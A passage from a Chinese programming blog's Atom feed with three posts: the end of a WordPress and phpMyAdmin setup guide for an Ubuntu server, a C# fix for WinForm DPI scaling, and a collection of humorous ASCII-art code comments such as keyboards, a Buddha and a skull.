phpmyadmin</strong><br>非必须安装，不过安装下方便直接操作数据库，安装时记得选择apache。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install phpmyadmin</span><br><span class="line">ln -s /etc/phpmyadmin/apache.conf /etc/apache2/conf-available/phpmyadmin.conf</span><br><span class="line">sudo service apache2 restart</span><br><span class="line">sudo a2enconf phpmyadmin</span><br></pre></td></tr></table></figure><br>启用Apache mod_rewrite模块。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo a2enmod rewrite</span><br><span class="line">sudo service apache2 restart</span><br></pre></td></tr></table></figure><br><strong>初始化数据库</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql -u root -p </span><br><span class="line">Enter Password: 密码（密码输入不可见)</span><br><span class="line">mysql&gt;CREATE DATABASE wordpress;</span><br><span class="line">mysql&gt;GRANT ALL PRIVILEGES ON *.* TO <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">mysql&gt;FLUSH PRIVILEGES;</span><br><span class="line">mysql&gt;<span class="built_in">exit</span></span><br><span class="line">sudo service mysql restart</span><br></pre></td></tr></table></figure><br><strong>配置WordPress</strong><br>下载并解压后将wordpress目录下所有文件复制到/var/www/html<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://cn.wordpress.org/latest-zh_CN.tar.gz</span><br><span class="line">tar zxvf latest-zh_CN.tar.gz</span><br><span class="line">cp -r wordpress/* /var/www/html</span><br></pre></td></tr></table></figure><br>接下来就可以访问服务器ip进行最后的配置了。<br>另外，访问 <a href="http://ip/phpmyadmin">http://ip/phpmyadmin</a> 可以访问 phpmyadmin。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&amp;emsp;&amp;emsp;WordPress是一个开源的博客平台，可以很方便的进行博客写作，搭建WordPress首先需要你有一个属于自己的服务器，服务器空间则更加方便（因为不需要自己安装各种前置软件），当然还是推荐买一个阿里云或腾讯云的学生机服务器。&lt;br&gt;</summary>
    
    
    
    <category term="Web" scheme="https://blog.todest.cn/categories/Web/"/>
    
    <category term="博客" scheme="https://blog.todest.cn/categories/Web/%E5%8D%9A%E5%AE%A2/"/>
    
    
    <category term="Linux" scheme="https://blog.todest.cn/tags/Linux/"/>
    
    <category term="WordPress" scheme="https://blog.todest.cn/tags/WordPress/"/>
    
  </entry>
  
  <entry>
    <title>解决WinForm DPI问题</title>
    <link href="https://blog.todest.cn/post/cc74b154/"/>
    <id>https://blog.todest.cn/post/cc74b154/</id>
    <published>2020-04-08T08:08:24.000Z</published>
    <updated>2020-05-11T09:50:49.686Z</updated>
    
    <content type="html"><![CDATA[<p>更改 Form 的 AutoScaleMode 属性值为 Dpi ，并修改 Program.cs 为以下内容。<br><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">STAThread</span>]</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">if</span> (Environment.OSVersion.Version.Major &gt;= <span class="number">6</span>)</span><br><span class="line">            SetProcessDPIAware();</span><br><span class="line"></span><br><span class="line">        Application.EnableVisualStyles();</span><br><span class="line">        Application.SetCompatibleTextRenderingDefault(<span class="literal">false</span>);</span><br><span class="line">        Application.Run(<span class="keyword">new</span> Form1());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">System.Runtime.InteropServices.DllImport(<span class="meta-string">&quot;user32.dll&quot;</span>)</span>]</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="keyword">bool</span> <span class="title">SetProcessDPIAware</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;更改 Form 的 AutoScaleMode 属性值为 Dpi ，并修改 Program.cs 为以下内容。&lt;br&gt;&lt;figure class=&quot;highlight csharp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span clas</summary>
      
    
    
    
    <category term="编程语言" scheme="https://blog.todest.cn/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    <category term="C#" scheme="https://blog.todest.cn/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/"/>
    
    
    <category term="GUI" scheme="https://blog.todest.cn/tags/GUI/"/>
    
    <category term="C#" scheme="https://blog.todest.cn/tags/C/"/>
    
    <category term="WinForm" scheme="https://blog.todest.cn/tags/WinForm/"/>
    
  </entry>
  
  <entry>
    <title>那些有趣的注释</title>
    <link href="https://blog.todest.cn/post/2626d8b6/"/>
    <id>https://blog.todest.cn/post/2626d8b6/</id>
    <published>2020-04-08T08:08:24.000Z</published>
    <updated>2020-05-11T09:45:14.316Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>标准键盘</strong></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * ┌───┐   ┌───┬───┬───┬───┐ ┌───┬───┬───┬───┐ ┌───┬───┬───┬───┐ ┌───┬───┬───┐</span><br><span class="line"> * │Esc│   │ F1│ F2│ F3│ F4│ │ F5│ F6│ F7│ F8│ │ F9│F10│F11│F12│ │P&#x2F;S│S L│P&#x2F;B│  ┌┐    ┌┐    ┌┐</span><br><span class="line"> * └───┘   └───┴───┴───┴───┘ └───┴───┴───┴───┘ └───┴───┴───┴───┘ └───┴───┴───┘  └┘    └┘    └┘</span><br><span class="line"> * ┌───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───────┐ ┌───┬───┬───┐ ┌───┬───┬───┬───┐</span><br><span class="line"> * │~ &#96;│! 1│@ 2│# 3│$ 4│% 5│^ 6│&amp; 7│* 8│( 9│) 0│_ -│+ &#x3D;│ BacSp │ │Ins│Hom│PUp│ │N L│ &#x2F; │ * │ - │</span><br><span class="line"> * ├───┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─────┤ ├───┼───┼───┤ ├───┼───┼───┼───┤</span><br><span class="line"> * │ Tab │ Q │ W │ E │ R │ T │ Y │ U │ I │ O │ P │&#123; [│&#125; ]│ | \ │ │Del│End│PDn│ │ 7 │ 8 │ 9 │   │</span><br><span class="line"> * ├─────┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴─────┤ └───┴───┴───┘ ├───┼───┼───┤ + │</span><br><span class="line"> * │ Caps │ A │ S │ D │ F │ G │ H │ J │ K │ L │: ;│&quot; &#39;│ Enter  │               │ 4 │ 5 │ 6 │   │</span><br><span class="line"> * ├──────┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴────────┤     ┌───┐     ├───┼───┼───┼───┤</span><br><span class="line"> * │ Shift  │ Z │ X │ C │ V │ B │ N │ M │&lt; ,│&gt; .│? &#x2F;│  Shift   │     │ ↑ │     │ 1 │ 2 │ 3 │   │</span><br><span class="line"> * ├─────┬──┴─┬─┴──┬┴───┴───┴───┴───┴───┴──┬┴───┼───┴┬────┬────┤ ┌───┼───┼───┐ ├───┴───┼───┤ E││</span><br><span class="line"> * │ Ctrl│    │Alt │         Space         │ Alt│    │    │Ctrl│ │ ← │ ↓ │ → │ │   0   │ . │←─┘│</span><br><span class="line"> * └─────┴────┴────┴───────────────────────┴────┴────┴────┴────┘ └───┴───┴───┘ └───────┴───┴───┘</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure><a id="more"></a><blockquote><p><strong>PC</strong></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">+------------------------------------------------------------------------+</span><br><span class="line">|                                                                        |</span><br><span class="line">|  +------------------------------------------------------------------+  |</span><br><span class="line">|  |                                                                  |  |</span><br><span class="line">|  |                                                                  |  |</span><br><span class="line">|  |                                                                  |  |</span><br><span class="line">|  |                                                                  |  |</span><br><span class="line">|  |                                                                  |  |</span><br><span class="line">|  |                                                                  |  |</span><br><span class="line">|  |                                                                  |  |</span><br><span class="line">|  |                                                                  |  |</span><br><span class="line">|  |                                                                  |  |</span><br><span class="line">|  |                                                                  |  |</span><br><span class="line">|  +------------------------------------------------------------------+  |</span><br><span class="line">|        f0    f1    f2    f3    f4    f5    f6    f7    f8    f9        |</span><br><span class="line">+------------------------------------------------------------------------+</span><br><span class="line">|                                                                        |</span><br><span class="line">|  [f0]  [f1]  [f2]  [f3]  [f4]  [f5]  [f6]  [f7]  [f8]  [f9]   [On&#x2F;Off] |</span><br><span class="line">|                                                                        |</span><br><span class="line">|     [Q]  [W]  [E]  [R]  [T]  [Y]  [U]  [I]  [O]  [P]   [&lt;] [^] [v] [^] |</span><br><span class="line">|                                                                        |</span><br><span class="line">|     [Q]  [W]  [E]  [R]  [T]  [Y]  [U]  [I]  [O]  [P]   [7] [8] [9] [&#x2F;] |</span><br><span class="line">|                                                                        |</span><br><span class="line">|       [A]  [S]  [D]  [F]  [G]  [H]  [J]  [K]  [L]      [4] [5] [6] [*] |</span><br><span class="line">|                                                                        |</span><br><span class="line">|  [CTRL]  [Z]  [X]  [C]  [V]  [B]  [N]  [M]  [ ENTER ]  [1] [2] [3] [-] |</span><br><span class="line">|                                                                        |</span><br><span class="line">|  [SHIFT]  [ALT]   [    space    ]   [,]  [.]  [SHIFT]  [0] [.] [&#x3D;] [+] |</span><br><span class="line">|                                                                        |</span><br><span class="line">+------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure><blockquote><p>**佛祖保佑，永无BUG</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;                            _ooOoo_    </span><br><span class="line">&#x2F;&#x2F;                           o8888888o    </span><br><span class="line">&#x2F;&#x2F;                           88&quot; . &quot;88    </span><br><span class="line">&#x2F;&#x2F;                           (| -_- |)    </span><br><span class="line">&#x2F;&#x2F;                            O\ &#x3D; &#x2F;O    </span><br><span class="line">&#x2F;&#x2F;                        ____&#x2F;&#96;---&#39;\____    </span><br><span class="line">&#x2F;&#x2F;                      .   &#39; \\| |&#x2F;&#x2F; &#96;.    </span><br><span class="line">&#x2F;&#x2F;                       &#x2F; \\||| : |||&#x2F;&#x2F; \    </span><br><span class="line">&#x2F;&#x2F;                     &#x2F; _||||| -:- |||||- \    </span><br><span class="line">&#x2F;&#x2F;                       | | \\\ - &#x2F;&#x2F;&#x2F; | |    </span><br><span class="line">&#x2F;&#x2F;                     | \_| &#39;&#39;\---&#x2F;&#39;&#39; | |    </span><br><span class="line">&#x2F;&#x2F;                      \ .-\__ &#96;-&#96; ___&#x2F;-. &#x2F;    </span><br><span class="line">&#x2F;&#x2F;                   ___&#96;. .&#39; &#x2F;--.--\ &#96;. . __    </span><br><span class="line">&#x2F;&#x2F;                .&quot;&quot; &#39;&lt; &#96;.___\_&lt;|&gt;_&#x2F;___.&#39; &gt;&#39;&quot;&quot;.    </span><br><span class="line">&#x2F;&#x2F;               | | : &#96;- \&#96;.;&#96;\ _ &#x2F;&#96;;.&#96;&#x2F; - &#96; : | |    </span><br><span class="line">&#x2F;&#x2F;                 \ \ &#96;-. \_ __\ &#x2F;__ _&#x2F; .-&#96; &#x2F; &#x2F;    </span><br><span class="line">&#x2F;&#x2F;         &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#96;-.____&#96;-.___\_____&#x2F;___.-&#96;____.-&#39;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;    </span><br><span class="line">&#x2F;&#x2F;                            &#96;&#x3D;---&#x3D;&#39;    </span><br><span class="line">&#x2F;&#x2F;    </span><br><span class="line">&#x2F;&#x2F;         .............................................    </span><br><span class="line">&#x2F;&#x2F;                  佛祖保佑             永无BUG</span><br></pre></td></tr></table></figure><blockquote><p>**神兽护体，永无BUG</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; ┏┓　　　┏┓</span><br><span class="line">&#x2F;&#x2F; ┏┛┻━━━┛┻┓</span><br><span class="line">&#x2F;&#x2F; ┃　　　　　　　┃ 　</span><br><span class="line">&#x2F;&#x2F; ┃　　　━　　　┃</span><br><span class="line">&#x2F;&#x2F; ┃　┳┛　┗┳　┃</span><br><span class="line">&#x2F;&#x2F; ┃　　　　　　　┃</span><br><span class="line">&#x2F;&#x2F; ┃　　　┻　　　┃</span><br><span class="line">&#x2F;&#x2F; ┃　　　　　　　┃</span><br><span class="line">&#x2F;&#x2F; ┗━┓　　　┏━┛</span><br><span class="line">&#x2F;&#x2F; ┃　　　┃ Code is far away from bug with the animal protecting　　　　　　　　</span><br><span class="line">&#x2F;&#x2F; ┃　　　┃ 神兽保护，永无BUG！</span><br><span class="line">&#x2F;&#x2F; ┃　　　┗━━━┓</span><br><span class="line">&#x2F;&#x2F; ┃　　　　　　　┣┓</span><br><span class="line">&#x2F;&#x2F; ┃　　　　　　　┏┛</span><br><span class="line">&#x2F;&#x2F; ┗┓┓┏━┳┓┏┛</span><br><span class="line">&#x2F;&#x2F; ┃┫┫　┃┫┫</span><br><span class="line">&#x2F;&#x2F; ┗┻┛　┗┻┛</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> *　　　　　　　　┏┓　　　┏┓+ +</span><br><span class="line"> *　　　　　　　┏┛┻━━━┛┻┓ + +</span><br><span class="line"> *　　　　　　　┃　　　　　　　┃ 　</span><br><span class="line"> *　　　　　　　┃　　　━　　　┃ ++ + + +</span><br><span class="line"> *　　　　　　 ████━████ ┃+</span><br><span class="line"> *　　　　　　　┃　　　　　　　┃ +</span><br><span class="line"> *　　　　　　　┃　　　┻　　　┃</span><br><span class="line"> *　　　　　　　┃　　　　　　　┃ + +</span><br><span class="line"> *　　　　　　　┗━┓　　　┏━┛</span><br><span class="line"> *　　　　　　　　　┃　　　┃　　　　　　　　　　　</span><br><span class="line"> *　　　　　　　　　┃　　　┃ + + + +</span><br><span class="line"> *　　　　　　　　　┃　　　┃　Code is far away from bug with the animal protecting　　　　　　　</span><br><span class="line"> *　　　　　　　　　┃　　　┃ + 神兽保佑,永无bug　　</span><br><span class="line"> *　　　　　　　　　┃　　　┃</span><br><span class="line"> *　　　　　　　　　┃　　　┃　　+　　　　　　　　　</span><br><span class="line"> *　　　　　　　　　┃　 　　┗━━━┓ + +</span><br><span class="line"> *　　　　　　　　　┃ 　　　　　　　┣┓</span><br><span class="line"> *　　　　　　　　　┃ 　　　　　　　┏┛</span><br><span class="line"> *　　　　　　　　　┗┓┓┏━┳┓┏┛ + + + +</span><br><span class="line"> *　　　　　　　　　　┃┫┫　┃┫┫</span><br><span class="line"> *　　　　　　　　　　┗┻┛　┗┻┛+ + + +</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure><blockquote><p><strong>程序员打油诗</strong></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> *                      江城子 . 程序员之歌</span><br><span class="line"> *</span><br><span class="line"> *                  十年生死两茫茫，写程序，到天亮。</span><br><span class="line"> *                      千行代码，Bug何处藏。</span><br><span class="line"> *                  纵使上线又怎样，朝令改，夕断肠。</span><br><span class="line"> *</span><br><span class="line"> *                  领导每天新想法，天天改，日日忙。</span><br><span class="line"> *                      相顾无言，惟有泪千行。</span><br><span class="line"> *                  每晚灯火阑珊处，夜难寐，加班狂。</span><br><span class="line">*&#x2F;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> *          写字楼里写字间，写字间里程序员；</span><br><span class="line"> *          程序人员写程序，又拿程序换酒钱。</span><br><span class="line"> *          酒醒只在网上坐，酒醉还来网下眠；</span><br><span class="line"> *          酒醉酒醒日复日，网上网下年复年。</span><br><span class="line"> *          但愿老死电脑间，不愿鞠躬老板前；</span><br><span class="line"> *          奔驰宝马贵者趣，公交自行程序员。</span><br><span class="line"> *          别人笑我忒疯癫，我笑自己命太贱；</span><br><span class="line"> *          不见满街漂亮妹，哪个归得程序员？</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure><blockquote><p><strong>单身狗</strong></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">                       ::</span><br><span class="line">                      :;J7, :,                        ::;7:</span><br><span class="line">                      ,ivYi, ,                       ;LLLFS:</span><br><span class="line">                      :iv7Yi                       :7ri;j5PL</span><br><span class="line">                     ,:ivYLvr                    ,ivrrirrY2X,</span><br><span class="line">                     :;r@Wwz.7r:                :ivu@kexianli.</span><br><span class="line">                    :iL7::,:::iiirii:ii;::::,,irvF7rvvLujL7ur</span><br><span class="line">                   ri::,:,::i:iiiiiii:i:irrv177JX7rYXqZEkvv17</span><br><span class="line">                ;i:, , ::::iirrririi:i:::iiir2XXvii;L8OGJr71i</span><br><span class="line">              :,, ,,:   ,::ir@mingyi.irii:i:::j1jri7ZBOS7ivv,</span><br><span class="line">                 ,::,    ::rv77iiiriii:iii:i::,rvLq@huhao.Li</span><br><span class="line">             ,,      ,, ,:ir7ir::,:::i;ir:::i:i::rSGGYri712:</span><br><span class="line">           :::  ,v7r:: ::rrv77:, ,, ,:i7rrii:::::, ir7ri7Lri</span><br><span class="line">          ,     2OBBOi,iiir;r::        ,irriiii::,, ,iv7Luur:</span><br><span class="line">        ,,     i78MBBi,:,:::,:,  :7FSL: ,iriii:::i::,,:rLqXv::</span><br><span class="line">        :      iuMMP: :,:::,:ii;2GY7OBB0viiii:i:iii:i:::iJqL;::</span><br><span class="line">       ,     ::::i   ,,,,, ::LuBBu BBBBBErii:i:i:i:i:i:i:r77ii</span><br><span class="line">      ,       :       , ,,:::rruBZ1MBBqi, :,,,:::,::::::iiriri:</span><br><span class="line">     ,               ,,,,::::i:  @arqiao.       ,:,, ,:::ii;i7:</span><br><span class="line">    :,       rjujLYLi   ,,:::::,:::::::::,,   ,:i,:,,,,,::i:iii</span><br><span class="line">    ::      BBBBBBBBB0,    ,,::: , ,:::::: ,      ,,,, ,,:::::::</span><br><span class="line">    i,  ,  ,8BMMBBBBBBi     ,,:,,     ,,, , ,   , , , :,::ii::i::</span><br><span class="line">    :      iZMOMOMBBM2::::::::::,,,,     ,,,,,,:,,,::::i:irr:i:::,</span><br><span class="line">    i   ,,:;u0MBMOG1L:::i::::::  ,,,::,   ,,, ::::::i:i:iirii:i:i:</span><br><span class="line">    :    ,iuUuuXUkFu7i:iii:i:::, :,:,: ::::::::i:i:::::iirr7iiri::</span><br><span class="line">    :     :rk@Yizero.i:::::, ,:ii:::::::i:::::i::,::::iirrriiiri::,</span><br><span class="line">     :      5BMBBBBBBSr:,::rv2kuii:::iii::,:i:,, , ,,:,:i@petermu.,</span><br><span class="line">          , :r50EZ8MBBBBGOBBBZP7::::i::,:::::,: :,:,::i;rrririiii::</span><br><span class="line">              :jujYY7LS0ujJL7r::,::i::,::::::::::::::iirirrrrrrr:ii:</span><br><span class="line">           ,:  :@kevensun.:,:,,,::::i:i:::::,,::::::iir;ii;7v77;ii;i,</span><br><span class="line">           ,,,     ,,:,::::::i:iiiii:i::::,, ::::iiiir@xingjief.r;7:i,</span><br><span class="line">        , , ,,,:,,::::::::iiiiiiiiii:,:,:::::::::iiir;ri7vL77rrirri::</span><br><span class="line">         :,, , ::::::::i:::i:::i:i::,,,,,:,::i:i:::iir;@Secbone.ii:::</span><br><span class="line"></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><blockquote><p><strong>骷髅头</strong></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> **************************************************************</span><br><span class="line"> *                                                            *</span><br><span class="line"> *   .&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-.       *</span><br><span class="line"> *    |                     ______                     |      *</span><br><span class="line"> *    |                  .-&quot;      &quot;-.                  |      *</span><br><span class="line"> *    |                 &#x2F;            \                 |      *</span><br><span class="line"> *    |     _          |              |          _     |      *</span><br><span class="line"> *    |    ( \         |,  .-.  .-.  ,|         &#x2F; )    |      *</span><br><span class="line"> *    |     &gt; &quot;&#x3D;._     | )(__&#x2F;  \__)( |     _.&#x3D;&quot; &lt;     |      *</span><br><span class="line"> *    |    (_&#x2F;&quot;&#x3D;._&quot;&#x3D;._ |&#x2F;     &#x2F;\     \| _.&#x3D;&quot;_.&#x3D;&quot;\_)    |      *</span><br><span class="line"> *    |           &quot;&#x3D;._&quot;(_     ^^     _)&quot;_.&#x3D;&quot;           |      *</span><br><span class="line"> *    |               &quot;&#x3D;\__|IIIIII|__&#x2F;&#x3D;&quot;               |      *</span><br><span class="line"> *    |              _.&#x3D;&quot;| \IIIIII&#x2F; |&quot;&#x3D;._              |      *</span><br><span class="line"> *    |    _     _.&#x3D;&quot;_.&#x3D;&quot;\          &#x2F;&quot;&#x3D;._&quot;&#x3D;._     _    |      *</span><br><span class="line"> *    |   ( \_.&#x3D;&quot;_.&#x3D;&quot;     &#96;--------&#96;     &quot;&#x3D;._&quot;&#x3D;._&#x2F; )   |      *</span><br><span class="line"> *    |    &gt; _.&#x3D;&quot;                            &quot;&#x3D;._ &lt;    |      *</span><br><span class="line"> *    |   (_&#x2F;                                    \_)   |      *</span><br><span class="line"> *    |                                                |      *</span><br><span class="line"> *    &#39;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;&#39;      *</span><br><span class="line"> *                                                            *</span><br><span class="line"> *           LASCIATE OGNI SPERANZA, VOI CH&#39;ENTRATE           *</span><br><span class="line"> **************************************************************</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure><blockquote><p><strong>顶</strong></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 頂頂頂頂頂頂頂頂頂　頂頂頂頂頂頂頂頂頂</span><br><span class="line"> * 頂頂頂頂頂頂頂　　　　　頂頂　　　　　</span><br><span class="line"> * 　　　頂頂　　　頂頂頂頂頂頂頂頂頂頂頂</span><br><span class="line"> * 　　　頂頂　　　頂頂頂頂頂頂頂頂頂頂頂</span><br><span class="line"> * 　　　頂頂　　　頂頂　　　　　　　頂頂</span><br><span class="line"> * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂</span><br><span class="line"> * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂</span><br><span class="line"> * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂</span><br><span class="line"> * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂</span><br><span class="line"> * 　　　頂頂　　　　　　　頂頂頂　</span><br><span class="line"> * 　　　頂頂　　　　　　頂頂　頂頂　頂頂</span><br><span class="line"> * 　頂頂頂頂　　　頂頂頂頂頂　頂頂頂頂頂</span><br><span class="line"> * 　頂頂頂頂　　　頂頂頂頂　　　頂頂頂頂</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure><blockquote><p>**BUG泛滥，我已瘫痪</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 